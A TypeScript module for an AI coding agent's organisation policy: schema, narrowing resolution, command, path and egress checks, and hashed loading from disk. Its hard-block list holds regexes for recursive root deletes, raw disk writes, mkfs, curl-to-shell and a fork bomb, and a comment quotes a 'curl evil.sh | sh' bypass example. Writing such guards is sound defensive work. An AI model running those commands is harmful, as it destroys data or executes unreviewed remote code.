import { readFileSync, existsSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { z } from 'zod';
import { sha256, canonicalJSON } from '../audit/hash.js';

/**
 * Org policy — the "可控 / controllable" pillar (see docs/APPROVABILITY-PLAN.md, Epic A1).
 *
 * A company, not the developer, bounds the agent's blast radius. Policy is discovered
 * from two layers and resolved by **narrowing (intersection)**: a repo-committed policy
 * can only ever make the machine-level policy *stricter*, never wider. This is the
 * keystone everyone else reads — `dvalincode trust` reports the resolved policy, the
 * Approval Pack snapshots it, and the tool layer enforces it.
 *
 * Threat model: the agent runs on the developer's own machine, so policy is
 * default-enforced and tamper-*evident* (its hash is recorded in the audit log at
 * run_start), not tamper-*proof* against a hostile local admin. Hard enforcement is the
 * job of the future server-mediated mode (A5).
 */

export const networkLevels = ['off', 'endpoint-only', 'on'] as const;
export type NetworkLevel = (typeof networkLevels)[number];

export const agentModes = ['chat', 'cowork', 'code', 'dvalin'] as const;
export type AgentMode = (typeof agentModes)[number];

export const unattendedPermissionModes = ['plan', 'auto', 'bypass'] as const;
export type UnattendedPermissionMode = (typeof unattendedPermissionModes)[number];

/** Restrictiveness rank — lower is stricter. Used to pick the most restrictive level. */
const NETWORK_RANK: Record<NetworkLevel, number> = { off: 0, 'endpoint-only': 1, on: 2 };

/** The shape of a policy file as authored. Every field is optional; absent = unrestricted. */
export const orgPolicySchema = z
  .object({
    modes: z.array(z.enum(agentModes)).optional(),
    providers: z.object({ allow: z.array(z.string()).optional() }).strict().optional(),
    models: z.object({ allow: z.array(z.string()).optional() }).strict().optional(),
    commands: z
      .object({
        allow: z.array(z.string()).optional(),
        deny: z.array(z.string()).optional(),
        defaultDeny: z.boolean().optional(),
      })
      .strict()
      .optional(),
    paths: z
      .object({
        allow: z.array(z.string()).optional(),
        deny: z.array(z.string()).optional(),
      })
      .strict()
      .optional(),
    tools: z.object({ deny: z.array(z.string()).optional() }).strict().optional(),
    mcp: z.object({ allow: z.array(z.string()).optional() }).strict().optional(),
    network: z.enum(networkLevels).optional(),
    maxToolCalls: z.number().int().positive().optional(),
    unattended: z
      .object({
        maxPermissionMode: z.enum(unattendedPermissionModes).optional(),
        maxIterations: z.number().int().positive().optional(),
        maxWallMinutes: z.number().positive().optional(),
      })
      .strict()
      .optional(),
  })
  .strict();

export type OrgPolicyInput = z.infer<typeof orgPolicySchema>;

/** A fully-resolved policy: defaults applied, all sources narrowed together. */
export type ResolvedPolicy = {
  /** Modes the agent may run in (default: all). */
  modes: AgentMode[];
  /** Provider id allowlist; undefined = any provider. */
  providers: { allow?: string[] };
  /** Model id allowlist; undefined = any model. */
  models: { allow?: string[] };
  /** Shell command policy. `allow` (if set) is an allowlist; `deny` always blocks. */
  commands: { allow?: string[]; deny: string[]; defaultDeny: boolean };
  /** Filesystem path policy, layered on top of .dvalincodeignore. Globs. */
  paths: { allow?: string[]; deny: string[] };
  /** Tool-name denylist. */
  tools: { deny: string[] };
  /** MCP server-id allowlist; undefined = any configured server is permitted. */
  mcp: { allow?: string[] };
  /** Outbound network posture. */
  network: NetworkLevel;
  /** Hard cap on tool calls per run; undefined = unlimited. */
  maxToolCalls?: number;
  /** Bounds applied to headless runs where no human is present. */
  unattended: {
    maxPermissionMode?: UnattendedPermissionMode;
    maxIterations?: number;
    maxWallMinutes?: number;
  };
};

/** The most permissive policy — equivalent to having no policy file at all. */
export function permissivePolicy(): ResolvedPolicy {
  return {
    modes: [...agentModes],
    providers: {},
    models: {},
    commands: { deny: [], defaultDeny: false },
    paths: { deny: [] },
    tools: { deny: [] },
    mcp: {},
    network: 'on',
    unattended: {},
  };
}

/** A policy decision. When denied, `rule` names the constraint that blocked it. */
export type Decision = { allowed: true } | { allowed: false; rule: string };

/**
 * Thrown when the tool layer blocks a call by policy. Carries structured fields so a
 * frontend can render it as a native inline denial (e.g. `⛔ Blocked by policy: …`)
 * rather than a raw error, keeping the UX on par with mainstream coding agents.
 */
export class PolicyViolationError extends Error {
  readonly tool: string;
  readonly rule: string;
  readonly target: string;
  constructor(tool: string, rule: string, target: string) {
    super(`Blocked by policy: ${rule}`);
    this.name = 'PolicyViolationError';
    this.tool = tool;
    this.rule = rule;
    this.target = target;
  }
}

const ALLOW: Decision = { allowed: true };
const deny = (rule: string): Decision => ({ allowed: false, rule });

// ── Resolution (narrowing) ────────────────────────────────────────────────────
// Every combinator only ever *restricts*. Order of sources is therefore irrelevant
// to safety: a developer-supplied source can never widen an IT-supplied one.

// List-valued fields carry set semantics, so every combinator returns a sorted result.
// This makes the resolved policy canonical: its hash is independent of source order,
// which is exactly what a tamper-evidence hash needs.

function intersectList<T>(a: T[], b: T[]): T[] {
  const set = new Set(b);
  return a.filter(x => set.has(x)).sort();
}

/** Intersect two allowlists where "undefined" means "no restriction (all)". */
function intersectAllow(a: string[] | undefined, b: string[] | undefined): string[] | undefined {
  if (a === undefined) return b ? [...b].sort() : undefined;
  if (b === undefined) return [...a].sort();
  return intersectList(a, b);
}

function union(a: string[], b: string[] | undefined): string[] {
  return [...new Set([...a, ...(b ?? [])])].sort();
}

function moreRestrictiveNetwork(a: NetworkLevel, b: NetworkLevel): NetworkLevel {
  return NETWORK_RANK[a] <= NETWORK_RANK[b] ? a : b;
}

function minDefined(a: number | undefined, b: number | undefined): number | undefined {
  if (a === undefined) return b;
  if (b === undefined) return a;
  return Math.min(a, b);
}

const UNATTENDED_PERMISSION_RANK: Record<UnattendedPermissionMode, number> = {
  plan: 0,
  auto: 1,
  bypass: 2,
};

/** Return the stricter of two unattended permission ceilings. */
export function narrowerUnattendedPermissionMode(
  a: UnattendedPermissionMode | undefined,
  b: UnattendedPermissionMode | undefined,
): UnattendedPermissionMode | undefined {
  if (a === undefined) return b;
  if (b === undefined) return a;
  return UNATTENDED_PERMISSION_RANK[a] <= UNATTENDED_PERMISSION_RANK[b] ? a : b;
}

/** True when `requested` stays at or below the configured ceiling. */
export function unattendedPermissionAllowed(
  requested: UnattendedPermissionMode,
  ceiling: UnattendedPermissionMode,
): boolean {
  return UNATTENDED_PERMISSION_RANK[requested] <= UNATTENDED_PERMISSION_RANK[ceiling];
}

/** Narrow a resolved policy by one authored source. Result is never wider than `base`. */
function narrow(base: ResolvedPolicy, next: OrgPolicyInput): ResolvedPolicy {
  return {
    modes: next.modes ? intersectList(base.modes, next.modes) : base.modes,
    providers: { allow: intersectAllow(base.providers.allow, next.providers?.allow) },
    models: { allow: intersectAllow(base.models.allow, next.models?.allow) },
    commands: {
      allow: intersectAllow(base.commands.allow, next.commands?.allow),
      deny: union(base.commands.deny, next.commands?.deny),
      defaultDeny: base.commands.defaultDeny || (next.commands?.defaultDeny ?? false),
    },
    paths: {
      allow: intersectAllow(base.paths.allow, next.paths?.allow),
      deny: union(base.paths.deny, next.paths?.deny),
    },
    tools: { deny: union(base.tools.deny, next.tools?.deny) },
    mcp: { allow: intersectAllow(base.mcp.allow, next.mcp?.allow) },
    network: next.network ? moreRestrictiveNetwork(base.network, next.network) : base.network,
    maxToolCalls: minDefined(base.maxToolCalls, next.maxToolCalls),
    unattended: {
      maxPermissionMode: narrowerUnattendedPermissionMode(
        base.unattended.maxPermissionMode,
        next.unattended?.maxPermissionMode,
      ),
      maxIterations: minDefined(base.unattended.maxIterations, next.unattended?.maxIterations),
      maxWallMinutes: minDefined(base.unattended.maxWallMinutes, next.unattended?.maxWallMinutes),
    },
  };
}

/** Resolve a set of authored policies into one effective policy by narrowing. */
export function resolvePolicy(sources: OrgPolicyInput[]): ResolvedPolicy {
  return sources.reduce<ResolvedPolicy>(narrow, permissivePolicy());
}

// ── Decision functions (enforced by the tool layer in A2) ───────────────────────

export function checkMode(p: ResolvedPolicy, mode: AgentMode): Decision {
  return p.modes.includes(mode) ? ALLOW : deny(`mode "${mode}" is not permitted by policy`);
}

export function checkProvider(p: ResolvedPolicy, provider: string): Decision {
  if (!p.providers.allow) return ALLOW;
  return p.providers.allow.includes(provider) ? ALLOW : deny(`provider "${provider}" is not in the allowlist`);
}

export function checkModel(p: ResolvedPolicy, model: string): Decision {
  if (!p.models.allow) return ALLOW;
  return p.models.allow.includes(model) ? ALLOW : deny(`model "${model}" is not in the allowlist`);
}

export function checkTool(p: ResolvedPolicy, toolName: string): Decision {
  return p.tools.deny.includes(toolName) ? deny(`tool "${toolName}" is denied by policy`) : ALLOW;
}

export function checkMcpServer(p: ResolvedPolicy, serverId: string): Decision {
  if (!p.mcp.allow) return ALLOW;
  return p.mcp.allow.includes(serverId) ? ALLOW : deny(`MCP server "${serverId}" is not in the allowlist`);
}

/** Is an outbound connection permitted? `isModelEndpoint` flags the configured LLM host. */
export function checkEgress(p: ResolvedPolicy, isModelEndpoint: boolean): Decision {
  if (p.network === 'on') return ALLOW;
  if (p.network === 'off') return deny('network egress is disabled by policy (network: off)');
  return isModelEndpoint ? ALLOW : deny('only the configured model endpoint is reachable (network: endpoint-only)');
}

/**
 * Commands refused whatever the policy says. Unlike every other rule here these
 * are not authored, cannot be narrowed away, and have no allowlist escape: a
 * policy file is a blast-radius control, not a licence to wipe the disk.
 *
 * Each entry names a class of irreversible damage rather than a specific tool,
 * and is matched against every segment of a compound command as well as the
 * whole line — `ls && rm -rf ~` is `rm -rf ~`.
 */
const HARD_BLOCKED: { pattern: RegExp; what: string }[] = [
  // Recursive delete rooted at /, $HOME or a drive root. `rm -rf ./build` is
  // ordinary work and stays allowed; only the roots are unconditional.
  {
    pattern: /\brm\s+(?:-\w*\s+)*-\w*[rR]\w*\s+(?:-\w*\s+)*(?:\/|~|\$HOME|\$\{HOME\}|[A-Za-z]:[\\/])(?:\s|\*|$)/,
    what: 'a recursive delete of the filesystem root or home directory',
  },
  // Writing a raw device destroys partition tables and filesystems outright.
  { pattern: /\bdd\b[^|;]*\bof=\/dev\/(?!null\b|zero\b|random\b|urandom\b|tty\b|std)/, what: 'a raw write to a block device' },
  { pattern: /\bmkfs(\.\w+)?\b/, what: 'formatting a filesystem' },
  { pattern: />\s*\/dev\/(?:sd|nvme|hd|disk|rdisk)\w*/, what: 'a redirect onto a block device' },
  // Piping a downloaded script straight into a shell executes code nobody read.
  {
    pattern: /\b(?:curl|wget|iwr|Invoke-WebRequest)\b[^|]*\|\s*(?:sudo\s+)?(?:ba|z|k|da|fi)?sh\b/,
    what: 'executing a downloaded script without inspecting it',
  },
  { pattern: /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/, what: 'a fork bomb' },
];

/**
 * Shell constructs an allowlist must never admit on its own. Each one either
 * runs a command the allowlist never saw (substitution) or writes somewhere the
 * pattern says nothing about (redirect), so matching the visible text proves
 * nothing about what will actually happen.
 */
const ALLOWLIST_DISQUALIFIERS: { pattern: RegExp; what: string }[] = [
  { pattern: /\$\(/, what: 'command substitution $(…)' },
  { pattern: /`/, what: 'command substitution with backticks' },
  { pattern: /(^|[^0-9<>])>{1,2}[^>]/, what: 'output redirection' },
  { pattern: /(^|\s)<(?!<)/, what: 'input redirection' },
];

/**
 * Split a command line on unquoted shell operators. Quoting is tracked so that
 * `echo "a && b"` stays one segment: the text inside quotes is an argument, not
 * a second command.
 */
export function splitCommandSegments(commandLine: string): string[] {
  const segments: string[] = [];
  let current = '';
  let quote: "'" | '"' | undefined;

  for (let i = 0; i < commandLine.length; i++) {
    const char = commandLine[i];
    if (char === '\\' && quote !== "'") {
      current += char + (commandLine[++i] ?? '');
      continue;
    }
    if (quote) {
      current += char;
      if (char === quote) quote = undefined;
      continue;
    }
    if (char === "'" || char === '"') {
      quote = char;
      current += char;
      continue;
    }
    const two = commandLine.slice(i, i + 2);
    if (two === '&&' || two === '||') {
      segments.push(current);
      current = '';
      i++;
      continue;
    }
    if (char === ';' || char === '|' || char === '&' || char === '\n') {
      segments.push(current);
      current = '';
      continue;
    }
    current += char;
  }
  segments.push(current);

  return segments.map(segment => segment.trim()).filter(Boolean);
}

/**
 * Admission for one command line, in four layers — hard blocks, the denylist,
 * the allowlist, then default-deny.
 *
 * Every layer judges **each segment of a compound command**, not the line as a
 * whole. Matching the whole line let `npm run build; curl evil.sh | sh` through
 * on an allowlist of `^npm run `, which made an allowlist — the strictest
 * configuration we offer — the easiest one to walk past.
 */
export function checkCommand(p: ResolvedPolicy, commandLine: string): Decision {
  const segments = splitCommandSegments(commandLine);
  // A fork bomb is only a fork bomb whole, so the line itself is judged too.
  const candidates = [commandLine, ...segments];

  for (const candidate of candidates) {
    for (const { pattern, what } of HARD_BLOCKED) {
      if (pattern.test(candidate)) return deny(`command is blocked unconditionally: ${what}`);
    }
  }

  for (const pattern of p.commands.deny) {
    for (const candidate of candidates) {
      if (safeMatch(pattern, candidate)) return deny(`command matches denylist: /${pattern}/`);
    }
  }

  if (p.commands.allow) {
    for (const { pattern, what } of ALLOWLIST_DISQUALIFIERS) {
      if (pattern.test(commandLine)) {
        return deny(`the allowlist does not admit a command using ${what}`);
      }
    }
    const allow = p.commands.allow;
    for (const segment of segments) {
      if (!allow.some(pattern => safeMatch(pattern, segment))) return deny('command is not in the allowlist');
    }
    if (segments.length === 0) return deny('command is not in the allowlist');
  } else if (p.commands.defaultDeny) {
    return deny('command blocked by default-deny (no allowlist match)');
  }
  return ALLOW;
}

export function checkPath(p: ResolvedPolicy, filePath: string): Decision {
  const norm = filePath.replace(/\\/g, '/');
  for (const glob of p.paths.deny) {
    if (globToRegExp(glob).test(norm)) return deny(`path is denied by policy: ${glob}`);
  }
  if (p.paths.allow) {
    const ok = p.paths.allow.some(glob => globToRegExp(glob).test(norm));
    if (!ok) return deny('path is outside the policy allowlist');
  }
  return ALLOW;
}

/** Compile a command pattern to a RegExp; a malformed pattern never matches. */
function safeMatch(pattern: string, value: string): boolean {
  try {
    return new RegExp(pattern).test(value);
  } catch {
    return false;
  }
}

/** Minimal glob → RegExp supporting `**`, `*`, and `?`. Anchored full-string match. */
function globToRegExp(glob: string): RegExp {
  let re = '';
  for (let i = 0; i < glob.length; i++) {
    const c = glob[i];
    if (c === '*') {
      if (glob[i + 1] === '*') {
        re += '.*';
        i++;
      } else {
        re += '[^/]*';
      }
    } else if (c === '?') {
      re += '[^/]';
    } else {
      re += c.replace(/[.+^${}()|[\]\\]/g, '\\$&');
    }
  }
  return new RegExp(`^${re}$`);
}

// ── Loading from disk ───────────────────────────────────────────────────────────

/** A policy source on disk, with its integrity hash for tamper-evidence. */
export type PolicySource = {
  /** Layer: machine, repository, or an optional per-run narrowing overlay. */
  layer: 'machine' | 'repo' | 'runtime';
  path: string;
  present: boolean;
  /** SHA-256 of the raw file content; null when absent. */
  hash: string | null;
  /** Parse/validation error, if the file existed but could not be applied. */
  error?: string;
};

/** Resolved policy plus provenance: which files contributed and their hashes. */
export type LoadedPolicy = {
  policy: ResolvedPolicy;
  sources: PolicySource[];
  /** SHA-256 of the canonicalized resolved policy — recorded at run_start. */
  hash: string;
};

/** Machine-level policy path (IT-pushed). Overridable for tests. */
export function machinePolicyPath(): string {
  return process.env.DVALINCODE_POLICY_FILE ?? path.join(os.homedir(), '.dvalincode', 'policy.json');
}

/** Repo-level policy path (team-committed, narrowing only). */
export function repoPolicyPath(cwd: string): string {
  return path.join(cwd, 'dvalin.policy.json');
}

/** Optional per-run narrowing policy, used by governed evaluation harnesses. */
export function runtimePolicyPath(): string | undefined {
  return process.env.DVALINCODE_RUNTIME_POLICY_FILE || undefined;
}

/** Hash of a resolved policy, for the audit run_start record and `trust`. */
export function policyHash(policy: ResolvedPolicy): string {
  return sha256(canonicalJSON(policy));
}

function readSource(layer: PolicySource['layer'], file: string): { source: PolicySource; parsed?: OrgPolicyInput } {
  if (!existsSync(file)) {
    return { source: { layer, path: file, present: false, hash: null } };
  }
  let raw: string;
  try {
    raw = readFileSync(file, 'utf8');
  } catch (err) {
    return { source: { layer, path: file, present: true, hash: null, error: errMsg(err) } };
  }
  const hash = sha256(raw);
  try {
    const parsed = orgPolicySchema.parse(JSON.parse(raw));
    return { source: { layer, path: file, present: true, hash }, parsed };
  } catch (err) {
    // Fail-safe: a malformed policy is NOT silently treated as "allow everything".
    // It is skipped and the error surfaced loudly via run_start / `trust` so the
    // gatekeeper sees that a policy was intended but did not apply.
    return { source: { layer, path: file, present: true, hash, error: errMsg(err) } };
  }
}

/**
 * Discover and resolve the effective policy for a workspace.
 * Reads the machine layer then the repo layer; narrows them together.
 */
export function loadPolicy(cwd: string = process.cwd()): LoadedPolicy {
  const results = [
    readSource('machine', machinePolicyPath()),
    readSource('repo', repoPolicyPath(cwd)),
  ];
  const runtime = runtimePolicyPath();
  if (runtime) results.push(readSource('runtime', runtime));
  const inputs = results.flatMap(r => (r.parsed ? [r.parsed] : []));
  const policy = resolvePolicy(inputs);
  return {
    policy,
    sources: results.map(r => r.source),
    hash: policyHash(policy),
  };
}

/** One Zod issue per line — used by `dvalincode policy check` for readable authoring feedback. */
export function formatZodIssues(err: z.ZodError): string[] {
  return err.issues.map(i => {
    const field = i.path.length ? i.path.join('.') : '(root)';
    return `${field}: ${i.message}`;
  });
}

export type PolicyValidationFailure = {
  ok: false;
  kind: 'missing' | 'read' | 'json' | 'schema';
  path: string;
  errors: string[];
};

export type PolicyValidationSuccess = {
  ok: true;
  path: string;
  fileHash: string;
  parsed: OrgPolicyInput;
};

/** Validate a policy file against `orgPolicySchema` without loading other layers. */
export function validatePolicyFile(file: string): PolicyValidationSuccess | PolicyValidationFailure {
  const resolved = path.resolve(file);
  if (!existsSync(resolved)) {
    return { ok: false, kind: 'missing', path: resolved, errors: ['file does not exist'] };
  }
  let raw: string;
  try {
    raw = readFileSync(resolved, 'utf8');
  } catch (err) {
    return { ok: false, kind: 'read', path: resolved, errors: [errMsg(err)] };
  }
  let json: unknown;
  try {
    json = JSON.parse(raw);
  } catch (err) {
    return {
      ok: false,
      kind: 'json',
      path: resolved,
      errors: [err instanceof Error ? err.message : String(err)],
    };
  }
  const parsed = orgPolicySchema.safeParse(json);
  if (!parsed.success) {
    return { ok: false, kind: 'schema', path: resolved, errors: formatZodIssues(parsed.error) };
  }
  return { ok: true, path: resolved, fileHash: sha256(raw), parsed: parsed.data };
}

export type PolicyCheckSuccess = {
  ok: true;
  path: string;
  policy: ResolvedPolicy;
  hash: string;
  sources: PolicySource[];
  /** Set when the machine layer exists but could not be applied (mirrors runtime). */
  machineWarning?: string;
};

export type PolicyCheckFailure = PolicyValidationFailure;

/**
 * Validate `file` and resolve the effective policy after narrowing with the machine layer.
 * The checked file must be valid; a malformed machine policy is skipped with `machineWarning`.
 */
export function resolveCheckedPolicy(
  file: string,
  cwd: string = process.cwd(),
): PolicyCheckSuccess | PolicyCheckFailure {
  const resolved = path.resolve(cwd, file);
  const validation = validatePolicyFile(resolved);
  if (!validation.ok) return validation;

  const machinePath = path.resolve(machinePolicyPath());
  const machine = readSource('machine', machinePath);
  const inputs: OrgPolicyInput[] = [];
  if (machine.parsed && resolved !== machinePath) inputs.push(machine.parsed);
  inputs.push(validation.parsed);
  const policy = resolvePolicy(inputs);

  const sources: PolicySource[] = [];
  if (resolved !== machinePath) sources.push(machine.source);
  sources.push({
    layer: resolved === machinePath ? 'machine' : 'repo',
    path: resolved,
    present: true,
    hash: validation.fileHash,
  });

  return {
    ok: true,
    path: resolved,
    policy,
    hash: policyHash(policy),
    sources,
    machineWarning: machine.source.error,
  };
}

function errMsg(err: unknown): string {
  if (err instanceof z.ZodError) return formatZodIssues(err).join('; ');
  return err instanceof Error ? err.message : String(err);
}
